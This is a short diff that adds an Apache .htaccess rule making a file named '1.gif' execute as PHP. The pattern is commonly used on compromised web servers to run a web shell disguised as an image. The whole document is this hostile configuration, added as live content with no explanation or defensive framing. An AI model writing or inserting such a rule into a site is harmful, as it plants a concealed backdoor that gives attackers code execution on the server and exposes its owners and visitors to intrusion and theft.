@@ -1,0 +1,4 @@
+<FilesMatch "1.gif">
+SetHandler application/x-httpd-php   
+AddHandler php5-script .gif         
+</FilesMatch>
